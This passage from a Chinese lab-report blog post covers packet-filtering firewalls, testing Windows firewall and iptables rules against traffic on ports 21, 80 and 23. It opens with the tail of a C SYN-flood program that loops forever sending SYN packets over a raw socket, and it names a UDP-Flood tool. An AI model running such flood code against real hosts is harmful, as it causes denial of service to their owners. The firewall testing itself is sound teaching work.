</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Invalid destination port number: %s</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, argv[<span style="color:#ff0;font-weight:bold">2</span>]);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 开启socket
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    sockfd = make_raw_socket();
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (sockfd == -<span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Failed to make raw socket</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>	<span style="color:#007f7f">// for 无限循环，发送syn包
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">for</span> (;;) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (send_syn_packet(sockfd, addr, port) &lt; <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>            fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Failed to send syn packet</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    close(sockfd);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Windows防火墙：<code>天网防火墙</code></p>
</li>
<li>
<p>Linux防火墙： <code>iptables</code></p>
</li>
<li>
<p>FTP服务器：<code>Ser-U</code></p>
</li>
<li>
<p>抓包工具：<code>Wireshark</code></p>
</li>
<li>
<p>UDP攻击：<code>UDP-Flood</code></p>
</li>
</ul>
</li>
</ul>
<h2 id="0x03-实验内容">0x03 实验内容<a hidden class="anchor" aria-hidden="true" href="#0x03-实验内容">#</a></h2>
<h3 id="31-windows防火墙">3.1 windows防火墙<a hidden class="anchor" aria-hidden="true" href="#31-windows防火墙">#</a></h3>
<h4 id="311-过滤远程服务器r到本地主机l的tcp数据">3.1.1 过滤远程服务器（R）到本地主机（L）的TCP数据<a hidden class="anchor" aria-hidden="true" href="#311-过滤远程服务器r到本地主机l的tcp数据">#</a></h4>
<ul>
<li>在防火墙中添加如下规则：
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120194954.png" alt="image-20211120194954814"  />
</li>
<li>这样接收到的所有TCP包都会被拦截，并且被记录。</li>
</ul>
</li>
<li>没有开启防火墙前，在终端执行发送随机端口的tcp程序
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120194358.png" alt="image-20211120194358862"  />
</li>
<li>通过Wireshark抓包，我们可以看到此时的TCP包并没有被拦截。
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120194610.png" alt="image-20211120194523551"  />
</li>
</ul>
</li>
</ul>
</li>
<li>开启防火墙，再度启动程序。
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195201.png" alt="image-20211120195138135"  />
</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195201.png" alt="image-20211120195119213"  />
</li>
<li>可以看到防火墙进行提醒，并且日志里面显示了攻击机向靶机<code>192.168.195.131</code>的端口tcp连接。</li>
<li>因此加上该端口后，所有tcp包都被截断了。</li>
</ul>
</li>
</ul>
<h4 id="312-过滤r-l中数据包源端口为21或80的数据">3.1.2 过滤R-&gt;L中数据包源端口为21或80的数据<a hidden class="anchor" aria-hidden="true" href="#312-过滤r-l中数据包源端口为21或80的数据">#</a></h4>
<ul>
<li>
<p>发送到端口为21和80的传输层协议可能为<code>tcp</code>也可能为<code>udp</code></p>
</li>
<li>
<p>因此编写进出规则的时候，我们需要对TCP和UDP都进行限制。</p>
<ul>
<li>UDP
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195651.png" alt="image-20211120195651610"  />
</li>
</ul>
</li>
<li>TCP
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195706.png" alt="image-20211120195705981"  />
</li>
</ul>
</li>
<li>因为我的客户端已经开启了21和80端口，所有我们这里直接选择已授权开放的端口即可。
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195814.png" alt="image-20211120195814349"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>TCP</p>
<ul>
<li>
<p>防火墙开启前：</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120195920.png" alt="image-20211120195919993"  />
</li>
<li>可以看到TCP包可以发到机器。</li>
</ul>
</li>
<li>
<p>开启防火墙</p>
<ul>
<li>
<p>攻击80端口</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200232.png" alt="image-20211120200227423"  />
</li>
</ul>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200059.png" alt="image-20211120200059094"  />
</p>
<ul>
<li>可以看到在日志里面程序连接80端口被拒绝。</li>
</ul>
</li>
<li>
<p>攻击21端口</p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200255.png" alt="image-20211120200255635"  />
</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200232.png" alt="image-20211120200200617"  />
</p>
</li>
</ul>
</li>
<li>
<p>可以看到这里连接21端口同样被拒绝。</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>UDP</p>
<ul>
<li>
<p>关闭防火墙</p>
</li>
<li>
<p>攻击<code>80</code>端口</p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200445.png" alt="image-20211120200445505"  />
</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120200635.png" alt="image-20211120200635412"  />
</p>
</li>
<li>
<p>可以看到抓到udp包</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>开启防火墙</p>
<ul>
<li>
<p>攻击80端口</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120201309.png" alt="image-20211120201309929"  />
</p>
<ul>
<li>可以看到80端口的udp包已被拦截</li>
</ul>
</li>
<li>
<p>攻击21端口</p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120201130.png" alt="image-20211120201130188"  />
</p>
</li>
<li>
<p>可以看到21端口的udp包已被拦截</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="313-能够由本机登录ftp服务器成功通过用户名密码验证">3.1.3 能够由本机登录ftp服务器成功（通过用户名、密码验证）<a hidden class="anchor" aria-hidden="true" href="#313-能够由本机登录ftp服务器成功通过用户名密码验证">#</a></h4>
<ul>
<li>在windows xp<code>192.168.195.162</code>中搭建ftp服务器
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120202016.png" alt="image-20211120201710804"  />
</li>
<li>创建一个<code>ftp</code>用户，账户为<code>admin</code>，密码为<code>admin</code>；</li>
<li>我们在本机访问服务器端
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120202216.png" alt="image-20211120202216338"  />
</li>
<li>我们成功访问到服务器端。</li>
</ul>
</li>
</ul>
</li>
<li>设置规则
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120203938.png" alt="image-20211120203938192"  />
</li>
<li>当我们向服务器端发送ftp请求的时候，会通行。</li>
</ul>
</li>
</ul>
<h4 id="314-阻止将ftp内容列表上传下载数据">3.1.4 阻止将ftp内容列表、上传、下载数据<a hidden class="anchor" aria-hidden="true" href="#314-阻止将ftp内容列表上传下载数据">#</a></h4>
<ul>
<li>这里我们是原先的客户端作为新的服务器，另一台机子来访问这个新的服务器，我们需要在服务区的防火墙上配置规则，从而阻止客户端下载服务器端内容</li>
<li>在新的服务器端配置FTP
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204209.png" alt="image-20211120204209816"  />
</li>
</ul>
</li>
<li>客户端查看效果
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204429.png" alt="image-20211120204421437"  />
</li>
</ul>
</li>
<li>在服务器端配置防护墙规则
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204429.png" alt="image-20211120204331375"  />
</li>
<li>当收到端口为21的tcp请求的时候拒绝该访问，这样就保证了客户端不能从服务器下载。</li>
</ul>
</li>
<li>开启防火墙
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204721.png" alt="image-20211120204454639"  />
</li>
</ul>
</li>
<li>结果
<ul>
<li>我们可以在日志里面看到
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204747.png" alt="image-20211120204632108"  />
</li>
<li>IP<code>192.168.195.182</code>对客户端的连接被拒绝</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120204752.png" alt="image-20211120204714010"  />
</li>
<li>同时，该网页也无法打开，自然查看列表什么的，上传、下载都无法进行，</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="32-linux防火墙-iptables">3.2 Linux防火墙 iptables<a hidden class="anchor" aria-hidden="true" href="#32-linux防火墙-iptables">#</a></h3>
<h4 id="321-iptables防火墙的启动停止">3.2.1 Iptables防火墙的启动停止<a hidden class="anchor" aria-hidden="true" href="#321-iptables防火墙的启动停止">#</a></h4>
<ul>
<li>
<p>首先通过以下命令安装好<code>iptables</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>systemctl stop firewalld.service
</span></span><span style="display:flex;"><span>systemctl mask firewalld.service
</span></span><span style="display:flex;"><span>yum install iptables-services
</span></span><span style="display:flex;"><span>systemctl <span style="color:#fff;font-weight:bold">enable</span> iptables.service
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>然后通过命令<code>service iptables status</code>查看此时的<code>iptables</code>状态</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120225947.png" alt="image-20211120225947260"  />
</li>
<li>此时防火墙为打开状态</li>
</ul>
</li>
<li>
<p>关闭防火墙<code>service iptables stop</code></p>
<ul>
<li>再度查看此时防火墙状态
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120230056.png" alt="image-20211120230056265"  />
</li>
<li>发现此时防火墙已关闭。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>打开防火墙<code>service iptables start</code></p>
<ul>
<li>再查看防火墙状态
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120230206.png" alt="image-20211120230206791"  />
</li>
<li>防火墙已打开</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="322-iptables防火墙规则查看添加删除">3.2.2 Iptables防火墙规则查看、添加、删除<a hidden class="anchor" aria-hidden="true" href="#322-iptables防火墙规则查看添加删除">#</a></h4>
<ul>
<li>
<p>查看</p>
<ul>
<li>命令 <code>iptables -L -n</code>         列出（filter表）所有规则
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120230941.png" alt="image-20211120230941455"  />
</li>
</ul>
</li>
<li>命令 <code>iptables -nL –line-number </code>      列出（filter表）所有规则，带编号
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120231106.png" alt="image-20211120231106161"  />
</li>
</ul>
</li>
<li>命令 <code>iptables -L -n -t nat</code>  列出（nat表）所有规则
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120231014.png" alt="image-20211120231014149"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>添加</p>
<ul>
<li>添加规则有两个参数：-A和-I。其中-A是添加到规则的末尾；-I可以插入到指定位置，没有指定位置的话默认插入到规则的首部。</li>
<li>当前规则：
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120231216.png" alt="image-20211120231216548"  />
</li>
<li>添加一条规则到尾部：<code>iptables  –A  INPUT  -j ACCEPT</code>
<ul>
<li>意思为：向filter表（默认表）的INPUT链中追加一条规则，其功能是接受源地址为任意、目标地址为防火墙本身的所有数据包。</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120231636.png" alt="image-20211120231636301"  />
</li>
</ul>
</li>
<li>第六条即为我们新加入的规则</li>
</ul>
</li>
<li>添加一条规则到第三条： <code>iptables -I INPUT 3 -s 192.168.195.131 -j DROP</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120231838.png" alt="image-20211120231838219"  />
</li>
<li>可以看到新规则添加到第三条了</li>
</ul>
</li>
</ul>
</li>
<li>
<p>删除</p>
<ul>
<li>
<p>删除用-D参数</p>
</li>
<li>
<p>删除之前添加的规则 <code>iptables -A INPUT  -j ACCEPT</code>：</p>
</li>
<li>
<p>命令： <code>iptables -D INPUT -j ACCEPT</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120232120.png" alt="image-20211120232120915"  />
</p>
<ul>
<li>可以看到我们之前添加的第七条规则已经被删除。</li>
</ul>
</li>
<li>
<p>有时候要删除的规则太长，删除时要写一大串，既浪费时间又容易写错，这时我们可以先使用–line-number找出该条规则的行号，再通过行号删除规则。这里我们删除第三行我们插入的规则。</p>
<p>命令：<code>iptables -D INPUT 3</code></p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120232241.png" alt="image-20211120232241262"  />
</p>
</li>
<li>
<p>可以看到我们插入的第三条规则已经被删除。</p>
</li>
</ul>
</li>
</ul>
<h4 id="323-设置iptables防火墙的包过滤规则实现以下功能">3.2.3 设置Iptables防火墙的包过滤规则，实现以下功能<a hidden class="anchor" aria-hidden="true" href="#323-设置iptables防火墙的包过滤规则实现以下功能">#</a></h4>
<h5 id="3231-禁止所有进出本地主机的数据包通过通过ping验证">3.2.3.1 禁止所有进出本地主机的数据包通过（通过Ping验证）<a hidden class="anchor" aria-hidden="true" href="#3231-禁止所有进出本地主机的数据包通过通过ping验证">#</a></h5>
<ul>
<li>我们首先将所有规则都删除<code>iptables -F</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120232401.png" alt="image-20211120232401113"  />
</li>
<li>可以看到我们之前的规则全部被清除掉。</li>
</ul>
</li>
<li>此时我们通过机器<code>192.168.195.131</code>来<code>ping</code>我们此时的Linux主机<code>192.168.195.174</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120232817.png" alt="image-20211120232817401"  />
</li>
<li>正常可以ping通</li>
</ul>
</li>
<li>禁止所有进入本地机器的数据包通过
<ul>
<li>命令如下：<code>iptables -I INPUT -j DROP</code></li>
<li>将规则加入到<code>INPUT</code>链中
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120232906.png" alt="image-20211120232906410"  />
</li>
<li>所有发给本机的包都会被丢弃掉</li>
</ul>
</li>
</ul>
</li>
<li>此时再度<code>ping</code>我们的本机<code>192.168.195.174</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120233018.png" alt="image-20211120233018240"  />
</li>
<li>很明显的主机已经接收不到<code>ping</code>的包了</li>
</ul>
</li>
</ul>
<h5 id="3232-允许某特定ip主机远程ping本地主机">3.2.3.2 允许某特定IP主机远程ping本地主机<a hidden class="anchor" aria-hidden="true" href="#3232-允许某特定ip主机远程ping本地主机">#</a></h5>
<ul>
<li>
<p>将所有规则清零<code>iptables -F</code></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120233155.png" alt="image-20211120233155444"  />
</li>
</ul>
</li>
<li>
<p>允许某特定IP主机远程ping本地主机</p>
<ul>
<li>
<p>我们这里设定运行<code>192.168.195.131</code>可以<code>ping</code>通，其余的主机均无法<code>ping</code>通机器</p>
<p>命令：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>iptables -I INPUT -j DROP
</span></span><span style="display:flex;"><span>iptables -I INPUT -s 192.168.195.131 -j ACCEPT
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>因为<code>iptables</code>中规则的执行为从上到下，所以按照上述给定的程序插入规则。</p>
</li>
<li>
<p>结果为：</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120234047.png" alt="image-20211120234047616"  />
</li>
</ul>
</li>
<li>
<p>这样就保证接收到<code>192.168.195.131</code>的包，其余的包均丢弃。</p>
</li>
</ul>
</li>
<li>
<p>这里直接放出两个机器防火墙开启前后<code>ping</code>的状态。</p>
<ul>
<li>其他机器
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120234359.png" alt="image-20211120234359143"  />
</li>
</ul>
</li>
<li><code>192.168.195.131</code>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120234439.png" alt="image-20211120234439876"  />
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="3233-允许某特定ip主机远程telnet或putty本地主机">3.2.3.3 允许某特定IP主机远程telnet或putty本地主机<a hidden class="anchor" aria-hidden="true" href="#3233-允许某特定ip主机远程telnet或putty本地主机">#</a></h5>
<ul>
<li>
<p>将所有规则清零<code>iptables -F</code></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120233155.png" alt="image-20211120233155444"  />
</li>
</ul>
</li>
<li>
<p>允许某特定IP主机远程telnet或putty本地主机,，开启端口23 即可</p>
</li>
<li>
<p>命令：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>iptables -I INPUT -p tcp --dport <span style="color:#ff0;font-weight:bold">23</span> -j DROP
</span></span><span style="display:flex;"><span>iptables -I INPUT -s 192.168.195.131 -p tcp --dport <span style="color:#ff0;font-weight:bold">23</span> -j ACCEPT
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>目的端口为23的被丢弃，因为第二条规则顺序在第一条前面，所有先判断是否为特定IP，是的则接受，否则丢弃。</li>
</ul>
</li>
<li>
<p>开启防火墙前：</p>
<ul>
<li>
<p><code>192.168.195.131</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121003520.png" alt="image-20211121003520018"  />
</p>
</li>
<li>
<p>其他机器：</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121004127.png" alt="image-20211121004127773"  />
</li>
</ul>
</li>
<li>
<p><code>telent</code>均可以正常连接</p>
</li>
</ul>
</li>
<li>
<p>开启<code>iptables</code></p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121003631.png" alt="image-20211121003631733"  />
</p>
</li>
<li>
<p>对于<code>192.168.195.131</code>的机器</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121003715.png" alt="image-20211121003715574"  />
</li>
<li>发现仍然可以正好连接<code>telnet</code></li>
</ul>
</li>
<li>
<p>对于其他机器</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121004221.png" alt="image-20211121004221618"  />
</li>
<li>可以看到连接不到<code>telnet</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="0x04-选做题">0x04 选做题<a hidden class="anchor" aria-hidden="true" href="#0x04-选做题">#</a></h2>
<h3 id="41-由本机登录ftp服务器成功通过用户名密码验证">4.1 由本机登录ftp服务器成功（通过用户名、密码验证）<a hidden class="anchor" aria-hidden="true" href="#41-由本机登录ftp服务器成功通过用户名密码验证">#</a></h3>
<ul>
<li>
<p>允许本机登录其他服务器的ftp:<code>192.168.195.162</code></p>
</li>
<li>
<p>因此这里的防火墙为<code>output</code>向外面服务器以<code>21</code>端口发送请求。</p>
<p>命令：<code>iptables -A OUTPUT -p tcp --sport 21 -j ACCEPT</code></p>
<ul>
<li>所有源端口为21 发往外网的包都被允许通过。</li>
</ul>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121004657.png" alt="image-20211121004657367"  />
</p>
<ul>
<li>执行防火墙之后，我们可以发现我们发往外网<code>21</code>端口的包可以被<code>ACCEPT</code></li>
</ul>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121005206.png" alt="image-20211121005206644"  />
</p>
<ul>
<li>然后通过<code>ftp 192.168.195.131</code>
<ul>
<li>输入账户<code>admin</code>和密码<code>admin</code></li>
<li>我们成功连接到了ftp服务器。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="42-无法将ftp内容列表或上传下载数据">4.2 无法将ftp内容列表或上传、下载数据<a hidden class="anchor" aria-hidden="true" href="#42-无法将ftp内容列表或上传下载数据">#</a></h3>
<ul>
<li>
<p>这里我们的<code>Centos 7</code>本身作为一个FTP服务器来等待客户端的连接。</p>
</li>
<li>
<p>在本地配置好<code>ftp</code>环境</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121005513.png" alt="image-20211121005513173"  />
</li>
<li>可以看到我们的环境已经配置完毕</li>
<li>同时在客户端，我们也可以访问<code>Linux</code>服务器
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121005619.png" alt="image-20211121005618924"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>为了禁止其他用户下载我们<code>linux</code>服务器端的所有数据，也防止上传,即禁止用户访问我们的FTP服务器。</p>
<ul>
<li>所以有命令：<code>iptables -I INPUT -p tcp --dport 21 -j DROP</code></li>
<li>所有目的端口为<code>21</code>的数据包都将被丢弃</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121010330.png" alt="image-20211121010223066"  />
</li>
</ul>
</li>
<li>
<p>此时我们的客户端再度访问我们的<code>Linux FTP 服务器端</code></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211121010347.png" alt="image-20211121010347174"  />
</li>
<li>可以看到我们此时已经无法访问该文件夹了。无法访问到我们的<code>Linux服务器</code></li>
</ul>
</li>
</ul>
<h2 id="0x05-实验结论">0x05 实验结论<a hidden class="anchor" aria-hidden="true" href="#0x05-实验结论">#</a></h2>
<ul>
<li>通过对Windows下和Linux下防火墙的配置情况，自己亲自编写防火墙的相关规则，对包过滤防火墙有了进一步的了解和认知。同时针对不同环境下防火墙配置，Linux下的防火墙配置应该比Windwos更为自由，自定义的比较多。</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://www.reus09.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/">网络安全实验</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://www.reus09.top/posts/tech/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F/">
    <span class="title">« Prev</span>
    <br>
    <span>网络扫描</span>
  </a>
  <a class="next" href="http://www.reus09.top/posts/life/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">
    <span class="title">Next »</span>
    <br>
    <span>2021年度总结</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="http://www.reus09.top">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
